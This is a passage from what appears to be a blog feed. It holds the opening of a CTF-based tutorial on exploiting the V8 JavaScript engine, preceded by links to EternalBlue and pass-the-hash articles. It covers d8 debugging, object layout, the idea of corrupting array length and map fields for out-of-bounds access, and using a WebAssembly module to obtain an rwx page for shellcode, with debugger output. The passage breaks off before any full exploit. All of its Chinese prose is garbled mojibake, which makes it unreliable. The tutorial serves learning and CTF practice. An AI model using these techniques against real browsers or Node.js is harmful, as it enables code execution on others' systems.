blueæ°¸æ’ä¹‹è“ï¼‰æ¼æ´åˆ©ç”¨+ä¿®å¤æ–¹æ³•-CSDNåšå®¢</a><br><a href="https://bbs.kanxue.com/thread-269208.htm">[åŸåˆ›]MS17-010 â€œæ°¸æ’ä¹‹è“â€æ¼æ´åˆ†æä¸å¤ç°-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a><br><a href="https://cloud.tencent.com/developer/article/1861364">å†…ç½‘æ¸—é€ï½œè°ˆè°ˆHASHä¼ é€’é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢v8æ¼æ´åˆ©ç”¨</title>
      <link href="/2024/05/05/v8start/"/>
      <url>/2024/05/05/v8start/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ç›´è§‰å¾— <code>v8</code> æ¼æ´åˆ©ç”¨æ˜¯ä¸€ä»¶éå¸¸å¥½ç©çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ‰¾æ—¶é—´å…¥é—¨äº†ä¸€ä¸‹ï¼Œè¿™ç¯‡åšå®¢æ‰€ä½¿ç”¨çš„ç¯å¢ƒæ˜¯ <code>*CTF 2019</code> çš„ <code>oob</code>ï¼Œç›¸å…³é™„ä»¶è¯»è€…å¯ä»¥è‡ªè¡Œä¸Šç½‘æœç´¢ä¸‹è½½ã€‚è¿™ç¯‡åšå®¢ä¸»è¦ç”¨äºæ€»ç»“æœ¬äººåœ¨å…¥é—¨ <code>v8</code> æ¼æ´åˆ©ç”¨æ—¶æ‰€å­¦åˆ°çš„ä¸œè¥¿ï¼Œç”±äº <code>Qanux</code> åˆèœåˆçˆ±ç©ï¼Œæ–‡ç« ä¸å…å­˜åœ¨è®¸å¤šçš„é—®é¢˜ï¼Œè¯·è¯»è€…å¤šå¤šåŒ…å®¹  </p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œè‚¯å®šæœ‰å¾ˆå¤šäººæƒ³é—® v8 æ˜¯ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œä¸‹é¢æ˜¯åœ¨çŸ¥ä¹ä¸­æœåˆ°çš„å¯¹äº v8 çš„æè¿°ï¼š  </p><blockquote><p>V8å¼•æ“æ˜¯ç”±C++ç¼–å†™çš„Googleå¼€æºé«˜æ€§èƒ½JavaScriptå’ŒWebAssemblyå¼•æ“ï¼Œå®ƒç”¨äºChromeå’ŒNode.jsç­‰ã€‚<br>V8å¯ä»¥ç‹¬ç«‹è¿è¡Œï¼Œä¹Ÿå¯ä»¥åµŒå…¥åˆ°ä»»ä½•C++åº”ç”¨ç¨‹åºä¸­ã€‚<br>V8æ”¯æŒä¼—å¤šæ“ä½œç³»ç»Ÿï¼Œå¦‚Windowsã€linuxã€androidç­‰ï¼Œä¹Ÿæ”¯æŒå…¶ä»–ç¡¬ä»¶æ¶æ„ï¼Œå¦‚IA32,X64,ARMç­‰ï¼Œå…·æœ‰å¾ˆå¥½çš„å¯ç§»æ¤å’Œè·¨å¹³å°ç‰¹æ€§ã€‚  </p></blockquote><p>ä½œä¸º <code>js</code> å¼•æ“ï¼Œ<code>V8</code> ä¼šç¼–è¯‘ &#x2F; æ‰§è¡Œ <code>JavaScript</code> ä»£ç ï¼Œç®¡ç†å†…å­˜ï¼Œè´Ÿè´£åƒåœ¾å›æ”¶ï¼Œä¸å®¿ä¸»è¯­è¨€çš„äº¤äº’ç­‰ã€‚é€šè¿‡æš´éœ²å®¿ä¸»å¯¹è±¡ (å˜é‡ï¼Œå‡½æ•°ç­‰) åˆ° <code>JavaScript</code>ï¼Œ<code>JavaScript</code> å¯ä»¥è®¿é—®å®¿ä¸»ç¯å¢ƒä¸­çš„å¯¹è±¡ï¼Œå¹¶åœ¨è„šæœ¬ä¸­å®Œæˆå¯¹å®¿ä¸»å¯¹è±¡çš„æ“ä½œã€‚<br>æ¥ä¸‹æ¥çœ‹çœ‹ <code>v8</code> å·¥ä½œåŸç†çš„ç®€åŒ–ç»†åˆ†ï¼š  </p><img src="/2024/05/05/v8start/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å½“ <code>Chrome</code> æˆ– <code>Node.js</code> éœ€è¦æ‰§è¡Œä¸€æ®µ <code>JavaScript</code> ä»£ç æ—¶ï¼Œå®ƒä¼šå°†æºä»£ç ä¼ é€’ç»™ <code>V8</code>ã€‚<code>V8</code> å°† <code>JavaScript</code> æºä»£ç é€å…¥æ‰€è°“çš„è§£æå™¨ (<code>Parser</code>)ï¼Œè§£æå™¨ä¸ºæºä»£ç åˆ›å»ºä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘ (<code>AST</code>) è¡¨ç¤ºã€‚<code>AST</code> éšåè¢«ä¼ é€’ç»™æ–°å¼•å…¥çš„ <code>Ignition</code> è§£é‡Šå™¨ï¼Œåœ¨é‚£é‡Œå®ƒè¢«è½¬æ¢æˆä¸€ç³»åˆ—å­—èŠ‚ç ã€‚ç„¶åï¼Œ<code>Ignition</code> æ‰§è¡Œè¿™ä¸ªå­—èŠ‚ç åºåˆ—ã€‚<br>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œ<code>Ignition</code> æ”¶é›†äº†æœ‰å…³æŸäº›æ“ä½œè¾“å…¥çš„å‰–æä¿¡æ¯æˆ–åé¦ˆã€‚å…¶ä¸­ä¸€äº›åé¦ˆè¢« <code>Ignition</code> è‡ªèº«ç”¨æ¥åŠ é€Ÿåç»­çš„å­—èŠ‚ç è§£é‡Šã€‚ä¾‹å¦‚ï¼Œå¯¹äºå±æ€§è®¿é—®ï¼Œå¦‚æœåœ¨æ‰€æœ‰æ—¶é—´éƒ½å…·æœ‰ç›¸åŒçš„å½¢çŠ¶ (å³ä½ æ€»æ˜¯ä¸ºå±æ€§aä¼ é€’ä¸€ä¸ªå€¼ï¼Œå…¶ä¸­ <code>a</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²)ï¼Œæˆ‘ä»¬ä¼šç¼“å­˜å¦‚ä½•è·å– <code>a</code> å€¼çš„ä¿¡æ¯ã€‚åœ¨åç»­æ‰§è¡Œç›¸åŒçš„å­—èŠ‚ç æ—¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦å†æ¬¡æœç´¢aã€‚è¿™é‡Œçš„åº•å±‚æœºåˆ¶ç§°ä¸ºå†…è”ç¼“å­˜ (<code>IC</code>)ã€‚  </p><p>æ¥ä¸‹æ¥å†èŠèŠä»€ä¹ˆæ˜¯ <code>d8</code>ã€‚<code>d8</code> æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„è°ƒè¯•å·¥å…·ï¼Œä½ å¯ä»¥æŠŠå®ƒçœ‹æˆæ˜¯ <code>debug for V8</code> çš„ç¼©å†™ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>d8</code> æ¥æŸ¥çœ‹ <code>V8</code> åœ¨æ‰§è¡Œ <code>JavaScript</code> è¿‡ç¨‹ä¸­çš„å„ç§ä¸­é—´æ•°æ®ï¼Œæ¯”å¦‚ä½œç”¨åŸŸã€ASTã€å­—èŠ‚ç ã€ä¼˜åŒ–çš„äºŒè¿›åˆ¶ä»£ç ã€åƒåœ¾å›æ”¶çš„çŠ¶æ€ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <code>d8</code> æä¾›çš„ç§æœ‰ <code>API</code> æŸ¥çœ‹ä¸€äº›å†…éƒ¨ä¿¡æ¯ã€‚  </p><h2 id="èµ°è¿›v8"><a href="#èµ°è¿›v8" class="headerlink" title="èµ°è¿›v8"></a>èµ°è¿›v8</h2><p>æœ¬æ¥æƒ³å†™å†™å¦‚ä½•é…ç½® <code>v8</code> ç¯å¢ƒçš„ï¼Œå¯æ˜¯ç½‘ä¸Šç›¸å…³èµ„æ–™å¤ªå¤šäº†ï¼ŒåŠ ä¸Šç¬”è€…æ¯”è¾ƒæ‡’ï¼Œå°±æ²¡å†™ï¼Œç­‰å“ªå¤©å¿ƒè¡€æ¥æ½®å†è¡¥ä¸Šå§  </p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>åœ¨ç»™ <code>gdb</code> é…ç½®å¥½ <code>v8</code> çš„è°ƒè¯•æ–‡ä»¶åï¼Œå³å¯åˆ©ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è°ƒè¯•æˆ‘ä»¬çš„ <code>JavaScript</code> ä»£ç ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹å‘½ä»¤é‡Œé¢çš„å‡ ä¸ªå‚æ•°ï¼š  </p><ul><li>â€“allow-natives-syntaxï¼šå¼€å¯åŸç”Ÿ <code>API</code> (ç”¨çš„æ¯”è¾ƒå¤š)  </li><li>â€“shellï¼šè¿è¡Œè„šæœ¬ååˆ‡å…¥äº¤äº’æ¨¡å¼</li></ul><p>åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ä¸­åŠ å…¥å¦‚ä¸‹ä»£ç æ¥è¿›è¡Œè°ƒè¯•ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>%DebugPrint(obj);</code> ä½œç”¨ä¸ºæ‰“å°å¯¹è±¡çš„ä¿¡æ¯ (<code>debug</code> ç‰ˆæœ¬çš„ <code>d8</code> å¯ä»¥æ‰“å°å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œè€Œ <code>release</code> ç‰ˆæœ¬çš„ <code>d8</code> åªä¼šæ‰“å°å¯¹è±¡ç±»å‹å’Œå¯¹è±¡çš„åœ°å€)ï¼Œ<code>%SystemBreak();</code> çš„ä½œç”¨ç±»ä¼¼äºæ–­ç‚¹<br>ç”±äºæ ‡å‡†çš„ <code>JavaScript</code> å¹¶ä¸æ”¯æŒä»¥ä¸Šè¯­æ³•ï¼Œæ‰€ä»¥åœ¨è¿è¡Œæ—¶è¦åŠ ä¸Š <code>--allow-natives-syntax</code> é€‰é¡¹<br>ç°åœ¨ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥è¿›è¡Œæµ‹è¯•ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/05/05/v8start/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§æ‰“å°å‡ºäº†è¿™ä¸ªæ•´æ•°æ•°ç»„çš„åœ°å€ï¼Œç”±äºæˆ‘è¿™ä¸ª <code>d8</code> æ˜¯ <code>release</code> ç‰ˆæœ¬ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰æ‰“å°å‡ºè¯¥æ•°ç»„å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>job</code> å‘½ä»¤æ¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœ  </p><img src="/2024/05/05/v8start/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œæœ‰ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼Œé‚£å°±æ˜¯ <code>DebugPrint</code> æ‰“å°å‡ºæ¥çš„æ˜¯çœŸå®åœ°å€åŠ ä¸€ï¼Œè€Œ <code>job</code> å‘½ä»¤åé¢æ¥ç€çš„ä¹Ÿéœ€è¦æ˜¯ <code>object</code> çš„çœŸå®åœ°å€åŠ ä¸€ï¼Œä¸ç„¶ä¼šè¢«è§£ææˆ <code>smi</code> ç±»å‹  </p><h3 id="v8-objectçš„åŸºæœ¬ç»“æ„"><a href="#v8-objectçš„åŸºæœ¬ç»“æ„" class="headerlink" title="v8 objectçš„åŸºæœ¬ç»“æ„"></a>v8 objectçš„åŸºæœ¬ç»“æ„</h3><p>é¦–å…ˆç»™å‡º <code>object</code> çš„é€šç”¨ç»“æ„ï¼š  </p><img src="/2024/05/05/v8start/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä¸åŒå¯¹è±¡çš„ <code>object</code> ç»“æ„éƒ½ä¼šä¸ä¸€æ ·ï¼Œä½†æ˜¯éƒ½æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œç°åœ¨å°±æ¥è¯¦ç»†åˆ†æä¸Šé¢ç»™å‡ºçš„ä¾‹å­ï¼Œä¸ºäº†é˜²æ­¢å¿˜è®°ï¼Œè¿™é‡Œå†æ¬¡è´´å‡ºä»£ç ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ç»™å‡ºä¸€æ ·çš„ç»“æœï¼š  </p><img src="/2024/05/05/v8start/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹å‡ºè¯¥å¯¹è±¡ä¸º <code>JSArray</code>ï¼Œå…¶ç»“æ„å’Œ <code>object</code> çš„é€šç”¨ç»“æ„å·®ä¸å¤šï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹åŒºåˆ«<br>ä¸‹é¢æ˜¯ <code>JSArray</code> çš„ç»“æ„å›¾ï¼š</p><img src="/2024/05/05/v8start/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å…¶å„ä¸ªå­—æ®µçš„å«ä¹‰å¤§è‡´å¦‚ä¸‹ï¼š  </p><ul><li>mapï¼šå®šä¹‰äº†å¦‚ä½•è®¿é—®å¯¹è±¡ï¼Œå…·æœ‰ç›¸åŒ <code>Map</code> çš„ä¸¤ä¸ª <code>JS object</code> ï¼Œå°±ä»£è¡¨å…·æœ‰ç›¸åŒçš„ç±»å‹ï¼ˆå³å…·æœ‰ä»¥ç›¸åŒé¡ºåºå‘½åçš„ç›¸åŒå±æ€§ï¼‰ï¼Œæ¯”è¾ƒ Map çš„åœ°å€å³å¯ç¡®å®šç±»å‹æ˜¯å¦â¼€è‡´ï¼ŒåŒç†ï¼Œæ›¿æ¢æ‰ Map å°±å¯ä»¥è¿›è¡Œç±»å‹æ··æ·†ã€‚  </li><li>prototypeï¼šå¯¹è±¡çš„åŸå‹ï¼ˆå¦‚æœæœ‰ï¼‰ </li><li>elementsï¼šå¯¹è±¡çš„åœ°å€  </li><li>lengthï¼šé•¿åº¦</li></ul><p>æˆ‘ä»¬å¯ä»¥åœ¨ <code>gdb</code> ä¸­æŸ¥çœ‹ <code>elements</code>  </p><img src="/2024/05/05/v8start/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§ <code>elements</code> ä¸­çš„æ•°æ®ä¹Ÿåˆ†ä¸º <code>3</code> å±‚ï¼Œåˆ†åˆ«ä¸º <code>map</code> æŒ‡é’ˆã€<code>length</code>ã€<code>data</code><br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯ <code>elements</code> çš„åœ°å€æ˜¯åœ¨ <code>object</code> çš„ä¸Šæ–¹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºåœ¨ç”³è¯·ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ˜¯å…ˆå‘å †ç”³è¯·ä¸€å—ç©ºé—´ç”¨äºå­˜å‚¨å¯¹è±¡çš„æ•°æ®ï¼Œå†ç”³è¯·ä¸€å—ç©ºé—´ç”¨äºç®¡ç†è¯¥å¯¹è±¡ã€‚è™½ç„¶ <code>elements</code> æ˜¯åœ¨ obj ä¸Šä¸Šæ–¹ï¼Œä½†è¿™å¹¶ä¸ä»£è¡¨ <code>elements</code> å°±ä¸€å®šç´§è´´ç€ <code>obj</code>ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘æ‰“ç®—ç•™åˆ°åé¢å†è®²<br>å¥½åƒç›¸å…³ç»“æ„äº†è§£åˆ°è¿™é‡Œå°±å·®ä¸å¤šäº†ï¼Œå¦‚æœåé¢è¿˜æœ‰åˆ«çš„é‚£å°±å†è¡¥è¡¥å§ï¼ˆç¬‘  </p><h3 id="v8æ¼æ´åˆ©ç”¨æ€æƒ³"><a href="#v8æ¼æ´åˆ©ç”¨æ€æƒ³" class="headerlink" title="v8æ¼æ´åˆ©ç”¨æ€æƒ³"></a>v8æ¼æ´åˆ©ç”¨æ€æƒ³</h3><p>é€šè¿‡ä¸Šé¢å¯¹ <code>object</code> ç»“æ„çš„åˆ†æï¼Œä¹Ÿè®¸æœ‰äººå·²ç»çŸ¥é“è¿›è¡Œæ¼æ´çš„åˆ©ç”¨äº†ã€‚å¯ä»¥çŒœæµ‹æˆ‘ä»¬å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œè®¿é—®æ—¶ä¸‹æ ‡çš„æœ€å¤§å€¼æ˜¯ç”± <code>elements</code> ä¸Šçš„ <code>length</code> æ‰€å†³å®šçš„ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™ä¸ª <code>length</code> ä¸ºä¸€ä¸ªå¾ˆå¤§çš„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåšåˆ°è¶Šç•Œè¯»å†™ã€‚åŒæ—¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ <code>obj</code> ä¸­çš„ <code>map</code>ï¼Œæˆ‘ä»¬ä»¤å…¶å‡ºç°ç¥å¥‡çš„æ•ˆæœï¼Œå…·ä½“åœ¨ä¸‹é¢æ¼æ´åˆ©ç”¨ä¸­å†åˆ†æ<br>åœ¨å¹³æ—¶çš„ <code>CTF</code> é¢˜ç›®ä¸­æˆ‘ä»¬çš„ç›®çš„æ˜¯å¦‚ä½•è®©ç¨‹åºæ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code>ï¼Œè€Œåœ¨ <code>v8</code> ä¸­ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è®© v8 ä»»æ„æ‰§è¡Œæˆ‘ä»¬çš„ <code>shellcode</code><br>ç„¶è€Œå®ç°è¿™ä¸€åˆ‡éœ€è¦ä¸€ä¸ªå‰æï¼Œé‚£å°±æ˜¯éœ€è¦å­˜åœ¨ <code>rwx</code> æƒé™çš„åŒºåŸŸã€‚è¿™æ—¶å€™å°±éœ€è¦ <code>WASM</code> ç™»åœºäº†<br>ä»€ä¹ˆæ˜¯ <code>WASM</code>ï¼Ÿé¡¾åæ€ä¹‰ï¼Œæ˜¯ <code>Asm on the web</code>ï¼Œä½†å…¶å®ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æ±‡ç¼–ï¼Œåªæ˜¯æ›´åŠ æ¥è¿‘æ±‡ç¼–ã€‚<code>WASM</code> å¯ä»¥åœ¨ <code>Javascript Engine</code> çš„åœ°å€ç©ºé—´ä¸­å¯¼å…¥ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜é¡µã€‚<br>ä¸‹é¢çœ‹çœ‹è¿™ä¸€æ®µä»£ç ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_mod);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line">0x0d1dfcf5f929 &lt;JSFunction 0 (sfi = 0xd1dfcf5f8f1)&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f929</span><br><span class="line">0xd1dfcf5f929: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0d1dfcf42109 &lt;JSFunction (sfi = 0xe9259bc3b29)&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x0d1dfcf5f8f1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0xd1dfcf5f731</span><br><span class="line"> - WASM <span class="keyword">function</span> index 0</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x0e9259bc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#name: 0x0e9259bc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#arguments: 0x0e9259bc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#caller: 0x0e9259bc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: not available</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§æ­¤æ—¶å†…å­˜å·²ç»å‡ºç°äº†æ‹¥æœ‰ <code>rwx</code> æƒé™çš„åŒºåŸŸ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">0xfb58ac2e000      0xfb58ac2f000 rwxp     1000      0 